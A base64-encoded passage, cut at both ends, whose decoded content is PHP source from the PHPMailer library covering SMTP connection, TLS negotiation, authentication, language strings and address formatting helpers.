sbF9yZWNpcGllbnRzKSA+IGNvdW50KCRiYWRfcmNwdCkpIGFuZCAhJHRoaXMtPnNtdHAtPmRhdGEoJGhlYWRlciAuICRib2R5KSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdkYXRhX25vdF9hY2NlcHRlZCcpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CiAgICAgICAgJHNtdHBfdHJhbnNhY3Rpb25faWQgPSAkdGhpcy0+c210cC0+Z2V0TGFzdFRyYW5zYWN0aW9uSUQoKTsKICAgICAgICBpZiAoJHRoaXMtPlNNVFBLZWVwQWxpdmUpIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnJlc2V0KCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRjYWxsYmFja3MgYXMgJGNiKSB7CiAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKAogICAgICAgICAgICAgICAgJGNiWydpc3NlbnQnXSwKICAgICAgICAgICAgICAgIFskY2JbJ3RvJ11dLAogICAgICAgICAgICAgICAgW10sCiAgICAgICAgICAgICAgICBbXSwKICAgICAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0LAogICAgICAgICAgICAgICAgJGJvZHksCiAgICAgICAgICAgICAgICAkdGhpcy0+RnJvbSwKICAgICAgICAgICAgICAgIFsnc210cF90cmFuc2FjdGlvbl9pZCcgPT4gJHNtdHBfdHJhbnNhY3Rpb25faWRdCiAgICAgICAgICAgICk7CiAgICAgICAgfQogICAgICAgIC8vQ3JlYXRlIGVycm9yIG1lc3NhZ2UgZm9yIGFueSBiYWQgYWRkcmVzc2VzCiAgICAgICAgaWYgKGNvdW50KCRiYWRfcmNwdCkgPiAwKSB7CiAgICAgICAgICAgICRlcnJzdHIgPSAnJzsKICAgICAgICAgICAgZm9yZWFjaCAoJGJhZF9yY3B0IGFzICRiYWQpIHsKICAgICAgICAgICAgICAgICRlcnJzdHIgLj0gJGJhZFsndG8nXSAuICc6ICcgLiAkYmFkWydlcnJvciddOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oCiAgICAgICAgICAgICAgICAkdGhpcy0+bGFuZygncmVjaXBpZW50c19mYWlsZWQnKSAuICRlcnJzdHIsCiAgICAgICAgICAgICAgICBzZWxmOjpTVE9QX0NPTlRJTlVFCiAgICAgICAgICAgICk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgLyoqCiAgICAgKiBJbml0aWF0ZSBhIGNvbm5lY3Rpb24gdG8gYW4gU01UUCBzZXJ2ZXIuCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZSBvcGVyYXRpb24gZmFpbGVkLgogICAgICoKICAgICAqIEBwYXJhbSBhcnJheSAkb3B0aW9ucyBBbiBhcnJheSBvZiBvcHRpb25zIGNvbXBhdGlibGUgd2l0aCBzdHJlYW1fY29udGV4dF9jcmVhdGUoKQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHVzZXMgXFBIUE1haWxlclxQSFBNYWlsZXJcU01UUAogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc210cENvbm5lY3QoJG9wdGlvbnMgPSBudWxsKQogICAgewogICAgICAgIGlmIChudWxsID09PSAkdGhpcy0+c210cCkgewogICAgICAgICAgICAkdGhpcy0+c210cCA9ICR0aGlzLT5nZXRTTVRQSW5zdGFuY2UoKTsKICAgICAgICB9CiAgICAgICAgLy9JZiBubyBvcHRpb25zIGFyZSBwcm92aWRlZCwgdXNlIHdoYXRldmVyIGlzIHNldCBpbiB0aGUgaW5zdGFuY2UKICAgICAgICBpZiAobnVsbCA9PT0gJG9wdGlvbnMpIHsKICAgICAgICAgICAgJG9wdGlvbnMgPSAkdGhpcy0+U01UUE9wdGlvbnM7CiAgICAgICAgfQogICAgICAgIC8vIEFscmVhZHkgY29ubmVjdGVkPwogICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdGVkKCkpIHsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5zbXRwLT5zZXRUaW1lb3V0KCR0aGlzLT5UaW1lb3V0KTsKICAgICAgICAkdGhpcy0+c210cC0+c2V0RGVidWdMZXZlbCgkdGhpcy0+U01UUERlYnVnKTsKICAgICAgICAkdGhpcy0+c210cC0+c2V0RGVidWdPdXRwdXQoJHRoaXMtPkRlYnVnb3V0cHV0KTsKICAgICAgICAkdGhpcy0+c210cC0+c2V0VmVycCgkdGhpcy0+ZG9fdmVycCk7CiAgICAgICAgJGhvc3RzID0gZXhwbG9kZSgnOycsICR0aGlzLT5Ib3N0KTsKICAgICAgICAkbGFzdGV4Y2VwdGlvbiA9IG51bGw7CiAgICAgICAgZm9yZWFjaCAoJGhvc3RzIGFzICRob3N0ZW50cnkpIHsKICAgICAgICAgICAgJGhvc3RpbmZvID0gW107CiAgICAgICAgICAgIGlmICghcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICcvXigoc3NsfHRscyk6XC9cLykqKFthLXpBLVowLTlcLi1dKnxcW1thLWZBLUYwLTk6XStcXSk6PyhbMC05XSopJC8nLAogICAgICAgICAgICAgICAgdHJpbSgkaG9zdGVudHJ5KSwKICAgICAgICAgICAgICAgICRob3N0aW5mbwogICAgICAgICAgICApKSB7CiAgICAgICAgICAgICAgICBzdGF0aWM6OmVkZWJ1ZygkdGhpcy0+bGFuZygnY29ubmVjdF9ob3N0JykgLiAnICcgLiAkaG9zdGVudHJ5KTsKICAgICAgICAgICAgICAgIC8vIE5vdCBhIHZhbGlkIGhvc3QgZW50cnkKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vICRob3N0aW5mb1syXTogb3B0aW9uYWwgc3NsIG9yIHRscyBwcmVmaXgKICAgICAgICAgICAgLy8gJGhvc3RpbmZvWzNdOiB0aGUgaG9zdG5hbWUKICAgICAgICAgICAgLy8gJGhvc3RpbmZvWzRdOiBvcHRpb25hbCBwb3J0IG51bWJlcgogICAgICAgICAgICAvLyBUaGUgaG9zdCBzdHJpbmcgcHJlZml4IGNhbiB0ZW1wb3JhcmlseSBvdmVycmlkZSB0aGUgY3VycmVudCBzZXR0aW5nIGZvciBTTVRQU2VjdXJlCiAgICAgICAgICAgIC8vIElmIGl0J3Mgbm90IHNwZWNpZmllZCwgdGhlIGRlZmF1bHQgdmFsdWUgaXMgdXNlZAogICAgICAgICAgICAvL0NoZWNrIHRoZSBob3N0IG5hbWUgaXMgYSB2YWxpZCBuYW1lIG9yIElQIGFkZHJlc3MgYmVmb3JlIHRyeWluZyB0byB1c2UgaXQKICAgICAgICAgICAgaWYgKCFzdGF0aWM6OmlzVmFsaWRIb3N0KCRob3N0aW5mb1szXSkpIHsKICAgICAgICAgICAgICAgIHN0YXRpYzo6ZWRlYnVnKCR0aGlzLT5sYW5nKCdjb25uZWN0X2hvc3QnKSAuICcgJyAuICRob3N0ZW50cnkpOwogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHByZWZpeCA9ICcnOwogICAgICAgICAgICAkc2VjdXJlID0gJHRoaXMtPlNNVFBTZWN1cmU7CiAgICAgICAgICAgICR0bHMgPSAoJ3RscycgPT0gJHRoaXMtPlNNVFBTZWN1cmUpOwogICAgICAgICAgICBpZiAoJ3NzbCcgPT0gJGhvc3RpbmZvWzJdIG9yICgnJyA9PSAkaG9zdGluZm9bMl0gYW5kICdzc2wnID09ICR0aGlzLT5TTVRQU2VjdXJlKSkgewogICAgICAgICAgICAgICAgJHByZWZpeCA9ICdzc2w6Ly8nOwogICAgICAgICAgICAgICAgJHRscyA9IGZhbHNlOyAvLyBDYW4ndCBoYXZlIFNTTCBhbmQgVExTIGF0IHRoZSBzYW1lIHRpbWUKICAgICAgICAgICAgICAgICRzZWN1cmUgPSAnc3NsJzsKICAgICAgICAgICAgfSBlbHNlaWYgKCd0bHMnID09ICRob3N0aW5mb1syXSkgewogICAgICAgICAgICAgICAgJHRscyA9IHRydWU7CiAgICAgICAgICAgICAgICAvLyB0bHMgZG9lc24ndCB1c2UgYSBwcmVmaXgKICAgICAgICAgICAgICAgICRzZWN1cmUgPSAndGxzJzsKICAgICAgICAgICAgfQogICAgICAgICAgICAvL0RvIHdlIG5lZWQgdGhlIE9wZW5TU0wgZXh0ZW5zaW9uPwogICAgICAgICAgICAkc3NsZXh0ID0gZGVmaW5lZCgnT1BFTlNTTF9BTEdPX1NIQTI1NicpOwogICAgICAgICAgICBpZiAoJ3RscycgPT09ICRzZWN1cmUgb3IgJ3NzbCcgPT09ICRzZWN1cmUpIHsKICAgICAgICAgICAgICAgIC8vQ2hlY2sgZm9yIGFuIE9wZW5TU0wgY29uc3RhbnQgcmF0aGVyIHRoYW4gdXNpbmcgZXh0ZW5zaW9uX2xvYWRlZCwgd2hpY2ggaXMgc29tZXRpbWVzIGRpc2FibGVkCiAgICAgICAgICAgICAgICBpZiAoISRzc2xleHQpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleHRlbnNpb25fbWlzc2luZycpIC4gJ29wZW5zc2wnLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkaG9zdCA9ICRob3N0aW5mb1szXTsKICAgICAgICAgICAgJHBvcnQgPSAkdGhpcy0+UG9ydDsKICAgICAgICAgICAgJHRwb3J0ID0gKGludCkgJGhvc3RpbmZvWzRdOwogICAgICAgICAgICBpZiAoJHRwb3J0ID4gMCBhbmQgJHRwb3J0IDwgNjU1MzYpIHsKICAgICAgICAgICAgICAgICRwb3J0ID0gJHRwb3J0OwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdCgkcHJlZml4IC4gJGhvc3QsICRwb3J0LCAkdGhpcy0+VGltZW91dCwgJG9wdGlvbnMpKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+SGVsbykgewogICAgICAgICAgICAgICAgICAgICAgICAkaGVsbG8gPSAkdGhpcy0+SGVsbzsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkaGVsbG8gPSAkdGhpcy0+c2VydmVySG9zdG5hbWUoKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmhlbGxvKCRoZWxsbyk7CiAgICAgICAgICAgICAgICAgICAgLy9BdXRvbWF0aWNhbGx5IGVuYWJsZSBUTFMgZW5jcnlwdGlvbiBpZjoKICAgICAgICAgICAgICAgICAgICAvLyAqIGl0J3Mgbm90IGRpc2FibGVkCiAgICAgICAgICAgICAgICAgICAgLy8gKiB3ZSBoYXZlIG9wZW5zc2wgZXh0ZW5zaW9uCiAgICAgICAgICAgICAgICAgICAgLy8gKiB3ZSBhcmUgbm90IGFscmVhZHkgdXNpbmcgU1NMCiAgICAgICAgICAgICAgICAgICAgLy8gKiB0aGUgc2VydmVyIG9mZmVycyBTVEFSVFRMUwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U01UUEF1dG9UTFMgYW5kICRzc2xleHQgYW5kICdzc2wnICE9ICRzZWN1cmUgYW5kICR0aGlzLT5zbXRwLT5nZXRTZXJ2ZXJFeHQoJ1NUQVJUVExTJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHRscyA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkdGxzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNtdHAtPnN0YXJ0VExTKCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2Nvbm5lY3RfaG9zdCcpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAvLyBXZSBtdXN0IHJlc2VuZCBFSExPIGFmdGVyIFRMUyBuZWdvdGlhdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+aGVsbG8oJGhlbGxvKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TTVRQQXV0aCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5hdXRoZW50aWNhdGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+VXNlcm5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+UGFzc3dvcmQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+QXV0aFR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+b2F1dGgKICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2F1dGhlbnRpY2F0ZScpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICAgICAgICAgJGxhc3RleGNlcHRpb24gPSAkZXhjOwogICAgICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgICAgICAvLyBXZSBtdXN0IGhhdmUgY29ubmVjdGVkLCBidXQgdGhlbiBmYWlsZWQgVExTIG9yIEF1dGgsIHNvIGNsb3NlIGNvbm5lY3Rpb24gbmljZWx5CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAvLyBJZiB3ZSBnZXQgaGVyZSwgYWxsIGNvbm5lY3Rpb24gYXR0ZW1wdHMgaGF2ZSBmYWlsZWQsIHNvIGNsb3NlIGNvbm5lY3Rpb24gaGFyZAogICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOwogICAgICAgIC8vIEFzIHdlJ3ZlIGNhdWdodCBhbGwgZXhjZXB0aW9ucywganVzdCByZXBvcnQgd2hhdGV2ZXIgdGhlIGxhc3Qgb25lIHdhcwogICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucyBhbmQgbnVsbCAhPT0gJGxhc3RleGNlcHRpb24pIHsKICAgICAgICAgICAgdGhyb3cgJGxhc3RleGNlcHRpb247CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgIC8qKgogICAgICogQ2xvc2UgdGhlIGFjdGl2ZSBTTVRQIHNlc3Npb24gaWYgb25lIGV4aXN0cy4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNtdHBDbG9zZSgpCiAgICB7CiAgICAgICAgaWYgKG51bGwgIT09ICR0aGlzLT5zbXRwKSB7CiAgICAgICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdGVkKCkpIHsKICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5xdWl0KCk7CiAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+Y2xvc2UoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIC8qKgogICAgICogU2V0IHRoZSBsYW5ndWFnZSBmb3IgZXJyb3IgbWVzc2FnZXMuCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIGl0IGNhbm5vdCBsb2FkIHRoZSBsYW5ndWFnZSBmaWxlLgogICAgICogVGhlIGRlZmF1bHQgbGFuZ3VhZ2UgaXMgRW5nbGlzaC4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRsYW5nY29kZSAgSVNPIDYzOS0xIDItY2hhcmFjdGVyIGxhbmd1YWdlIGNvZGUgKGUuZy4gRnJlbmNoIGlzICJmciIpCiAgICAgKiBAcGFyYW0gc3RyaW5nICRsYW5nX3BhdGggUGF0aCB0byB0aGUgbGFuZ3VhZ2UgZmlsZSBkaXJlY3RvcnksIHdpdGggdHJhaWxpbmcgc2VwYXJhdG9yIChzbGFzaCkKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldExhbmd1YWdlKCRsYW5nY29kZSA9ICdlbicsICRsYW5nX3BhdGggPSAnJykKICAgIHsKICAgICAgICAvLyBCYWNrd2FyZHMgY29tcGF0aWJpbGl0eSBmb3IgcmVuYW1lZCBsYW5ndWFnZSBjb2RlcwogICAgICAgICRyZW5hbWVkX2xhbmdjb2RlcyA9IFsKICAgICAgICAgICAgJ2JyJyA9PiAncHRfYnInLAogICAgICAgICAgICAnY3onID0+ICdjcycsCiAgICAgICAgICAgICdkaycgPT4gJ2RhJywKICAgICAgICAgICAgJ25vJyA9PiAnbmInLAogICAgICAgICAgICAnc2UnID0+ICdzdicsCiAgICAgICAgICAgICdycycgPT4gJ3NyJywKICAgICAgICAgICAgJ3RnJyA9PiAndGwnLAogICAgICAgIF07CiAgICAgICAgaWYgKGlzc2V0KCRyZW5hbWVkX2xhbmdjb2Rlc1skbGFuZ2NvZGVdKSkgewogICAgICAgICAgICAkbGFuZ2NvZGUgPSAkcmVuYW1lZF9sYW5nY29kZXNbJGxhbmdjb2RlXTsKICAgICAgICB9CiAgICAgICAgLy8gRGVmaW5lIGZ1bGwgc2V0IG9mIHRyYW5zbGF0YWJsZSBzdHJpbmdzIGluIEVuZ2xpc2gKICAgICAgICAkUEhQTUFJTEVSX0xBTkcgPSBbCiAgICAgICAgICAgICdhdXRoZW50aWNhdGUnID0+ICdTTVRQIEVycm9yOiBDb3VsZCBub3QgYXV0aGVudGljYXRlLicsCiAgICAgICAgICAgICdjb25uZWN0X2hvc3QnID0+ICdTTVRQIEVycm9yOiBDb3VsZCBub3QgY29ubmVjdCB0byBTTVRQIGhvc3QuJywKICAgICAgICAgICAgJ2RhdGFfbm90X2FjY2VwdGVkJyA9PiAnU01UUCBFcnJvcjogZGF0YSBub3QgYWNjZXB0ZWQuJywKICAgICAgICAgICAgJ2VtcHR5X21lc3NhZ2UnID0+ICdNZXNzYWdlIGJvZHkgZW1wdHknLAogICAgICAgICAgICAnZW5jb2RpbmcnID0+ICdVbmtub3duIGVuY29kaW5nOiAnLAogICAgICAgICAgICAnZXhlY3V0ZScgPT4gJ0NvdWxkIG5vdCBleGVjdXRlOiAnLAogICAgICAgICAgICAnZmlsZV9hY2Nlc3MnID0+ICdDb3VsZCBub3QgYWNjZXNzIGZpbGU6ICcsCiAgICAgICAgICAgICdmaWxlX29wZW4nID0+ICdGaWxlIEVycm9yOiBDb3VsZCBub3Qgb3BlbiBmaWxlOiAnLAogICAgICAgICAgICAnZnJvbV9mYWlsZWQnID0+ICdUaGUgZm9sbG93aW5nIEZyb20gYWRkcmVzcyBmYWlsZWQ6ICcsCiAgICAgICAgICAgICdpbnN0YW50aWF0ZScgPT4gJ0NvdWxkIG5vdCBpbnN0YW50aWF0ZSBtYWlsIGZ1bmN0aW9uLicsCiAgICAgICAgICAgICdpbnZhbGlkX2FkZHJlc3MnID0+ICdJbnZhbGlkIGFkZHJlc3M6ICcsCiAgICAgICAgICAgICdtYWlsZXJfbm90X3N1cHBvcnRlZCcgPT4gJyBtYWlsZXIgaXMgbm90IHN1cHBvcnRlZC4nLAogICAgICAgICAgICAncHJvdmlkZV9hZGRyZXNzJyA9PiAnWW91IG11c3QgcHJvdmlkZSBhdCBsZWFzdCBvbmUgcmVjaXBpZW50IGVtYWlsIGFkZHJlc3MuJywKICAgICAgICAgICAgJ3JlY2lwaWVudHNfZmFpbGVkJyA9PiAnU01UUCBFcnJvcjogVGhlIGZvbGxvd2luZyByZWNpcGllbnRzIGZhaWxlZDogJywKICAgICAgICAgICAgJ3NpZ25pbmcnID0+ICdTaWduaW5nIEVycm9yOiAnLAogICAgICAgICAgICAnc210cF9jb25uZWN0X2ZhaWxlZCcgPT4gJ1NNVFAgY29ubmVjdCgpIGZhaWxlZC4nLAogICAgICAgICAgICAnc210cF9lcnJvcicgPT4gJ1NNVFAgc2VydmVyIGVycm9yOiAnLAogICAgICAgICAgICAndmFyaWFibGVfc2V0JyA9PiAnQ2Fubm90IHNldCBvciByZXNldCB2YXJpYWJsZTogJywKICAgICAgICAgICAgJ2V4dGVuc2lvbl9taXNzaW5nJyA9PiAnRXh0ZW5zaW9uIG1pc3Npbmc6ICcsCiAgICAgICAgXTsKICAgICAgICBpZiAoZW1wdHkoJGxhbmdfcGF0aCkpIHsKICAgICAgICAgICAgLy8gQ2FsY3VsYXRlIGFuIGFic29sdXRlIHBhdGggc28gaXQgY2FuIHdvcmsgaWYgQ1dEIGlzIG5vdCBoZXJlCiAgICAgICAgICAgICRsYW5nX3BhdGggPSBkaXJuYW1lKF9fRElSX18pIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdsYW5ndWFnZScgLiBESVJFQ1RPUllfU0VQQVJBVE9SOwogICAgICAgIH0KICAgICAgICAvL1ZhbGlkYXRlICRsYW5nY29kZQogICAgICAgIGlmICghcHJlZ19tYXRjaCgnL15bYS16XXsyfSg/Ol9bYS16QS1aXXsyfSk/JC8nLCAkbGFuZ2NvZGUpKSB7CiAgICAgICAgICAgICRsYW5nY29kZSA9ICdlbic7CiAgICAgICAgfQogICAgICAgICRmb3VuZGxhbmcgPSB0cnVlOwogICAgICAgICRsYW5nX2ZpbGUgPSAkbGFuZ19wYXRoIC4gJ3BocG1haWxlci5sYW5nLScgLiAkbGFuZ2NvZGUgLiAnLnBocCc7CiAgICAgICAgLy8gVGhlcmUgaXMgbm8gRW5nbGlzaCB0cmFuc2xhdGlvbiBmaWxlCiAgICAgICAgaWYgKCdlbicgIT0gJGxhbmdjb2RlKSB7CiAgICAgICAgICAgIC8vIE1ha2Ugc3VyZSBsYW5ndWFnZSBmaWxlIHBhdGggaXMgcmVhZGFibGUKICAgICAgICAgICAgaWYgKCFzdGF0aWM6OmlzUGVybWl0dGVkUGF0aCgkbGFuZ19maWxlKSB8fCAhZmlsZV9leGlzdHMoJGxhbmdfZmlsZSkpIHsKICAgICAgICAgICAgICAgICRmb3VuZGxhbmcgPSBmYWxzZTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIC8vIE92ZXJ3cml0ZSBsYW5ndWFnZS1zcGVjaWZpYyBzdHJpbmdzLgogICAgICAgICAgICAgICAgLy8gVGhpcyB3YXkgd2UnbGwgbmV2ZXIgaGF2ZSBtaXNzaW5nIHRyYW5zbGF0aW9uIGtleXMuCiAgICAgICAgICAgICAgICAkZm91bmRsYW5nID0gaW5jbHVkZSAkbGFuZ19maWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5sYW5ndWFnZSA9ICRQSFBNQUlMRVJfTEFORzsKICAgICAgICByZXR1cm4gKGJvb2wpICRmb3VuZGxhbmc7IC8vIFJldHVybnMgZmFsc2UgaWYgbGFuZ3VhZ2Ugbm90IGZvdW5kCiAgICB9CiAgICAvKioKICAgICAqIEdldCB0aGUgYXJyYXkgb2Ygc3RyaW5ncyBmb3IgdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VHJhbnNsYXRpb25zKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlOwogICAgfQogICAgLyoqCiAgICAgKiBDcmVhdGUgcmVjaXBpZW50IGhlYWRlcnMuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZQogICAgICogQHBhcmFtIGFycmF5ICAkYWRkciBBbiBhcnJheSBvZiByZWNpcGllbnRzLAogICAgICogICAgICAgICAgICAgICAgICAgICB3aGVyZSBlYWNoIHJlY2lwaWVudCBpcyBhIDItZWxlbWVudCBpbmRleGVkIGFycmF5IHdpdGggZWxlbWVudCAwIGNvbnRhaW5pbmcgYW4gYWRkcmVzcwogICAgICogICAgICAgICAgICAgICAgICAgICBhbmQgZWxlbWVudCAxIGNvbnRhaW5pbmcgYSBuYW1lLCBsaWtlOgogICAgICogICAgICAgICAgICAgICAgICAgICBbWydqb2VAZXhhbXBsZS5jb20nLCAnSm9lIFVzZXInXSwgWyd6b2VAZXhhbXBsZS5jb20nLCAnWm9lIFVzZXInXV0KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckFwcGVuZCgkdHlwZSwgJGFkZHIpCiAgICB7CiAgICAgICAgJGFkZHJlc3NlcyA9IFtdOwogICAgICAgIGZvcmVhY2ggKCRhZGRyIGFzICRhZGRyZXNzKSB7CiAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9ICR0aGlzLT5hZGRyRm9ybWF0KCRhZGRyZXNzKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICR0eXBlIC4gJzogJyAuIGltcGxvZGUoJywgJywgJGFkZHJlc3NlcykgLiBzdGF0aWM6OiRMRTsKICAgIH0KICAgIC8qKgogICAgICogRm9ybWF0IGFuIGFkZHJlc3MgZm9yIHVzZSBpbiBhIG1lc3NhZ2UgaGVhZGVyLgogICAgICoKICAgICAqIEBwYXJhbSBhcnJheSAkYWRkciBBIDItZWxlbWVudCBpbmRleGVkIGFycmF5LCBlbGVtZW50IDAgY29udGFpbmluZyBhbiBhZGRyZXNzLCBlbGVtZW50IDEgY29udGFpbmluZyBhIG5hbWUgbGlrZQogICAgICogICAgICAgICAgICAgICAgICAgIFsnam9lQGV4YW1wbGUuY29tJywgJ0pvZSBVc2VyJ10KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckZvcm1hdCgkYWRkcikKICAgIHsKICAgICAgICBpZiAoZW1wdHkoJGFkZHJbMV0pKSB7IC8vIE5vIG5hbWUgcHJvdmlkZWQKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMF0pOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRhZGRyWzFdKSwgJ3BocmFzZScpIC4gJyA8JyAuICR0aGlzLT5zZWN1cmVIZWFkZXIoCiAgICAgICAgICAgICAgICAkYWRkclswXQogICAgICAgICAgICApIC4gJz4nOwogICAgfQogICAgLyoqCiAgICAgKiBXb3JkLXdyYXAgbWVzc2FnZS4KICAgICAqIEZvciB1c2Ugd2l0aCBtYWlsZXJzIHRoYXQgZG8gbm90IGF1dG9tYXRpY2FsbHkgcGVyZm9ybSB3cmFwcGluZwogICAgICogYW5kIGZvciBxdW90ZWQtcHJpbnRhYmxlIGVuY29kZWQgbWVzc2FnZXMuCiAgICAgKiBPcmlnaW5hbCB3cml0dGVuIGJ5IHBoaWxpcHBlLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJG1lc3NhZ2UgVGhlIG1lc3NhZ2UgdG8gd3JhcAogICAgICogQHBhcmFtIGludCAgICAkbGVuZ3RoICBUaGUgbGluZSBsZW5ndGggdG8gd3JhcCB0bwogICAgICogQHBhcmFtIGJvb2wgICAkcXBfbW9kZSBXaGV0aGVyIHRvIHJ1biBpbiBRdW90ZWQtUHJpbnRhYmxlIG1vZGUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gd3JhcFRleHQoJG1lc3NhZ2UsICRsZW5ndGgsICRxcF9tb2RlID0gZmFsc2UpCiAgICB7CiAgICAgICAgaWYgKCRxcF9tb2RlKSB7CiAgICAgICAgICAgICRzb2Z0X2JyZWFrID0gc3ByaW50ZignID0lcycsIHN0YXRpYzo6JExFKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc29mdF9icmVhayA9IHN0YXRpYzo6JExFOwogICAgICAgIH0KICAgICAgICAvLyBJZiB1dGYtOCBlbmNvZGluZyBpcyB1c2VkLCB3ZSB3aWxsIG5lZWQgdG8gbWFrZSBzdXJlIHdlIGRvbid0CiAgICAgICAgLy8gc3BsaXQgbXVsdGlieXRlIGNoYXJhY3RlcnMgd2hlbiB3ZSB3cmFwCiAgICAgICAgJGlzX3V0ZjggPSBzdGF0aWM6OkNIQVJTRVRfVVRGOCA9PT0gc3RydG9sb3dlcigkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgJGxlbGVuID0gc3RybGVuKHN0YXRpYzo6JExFKTsKICAgICAgICAkY3JsZmxlbiA9IHN0cmxlbihzdGF0aWM6OiRM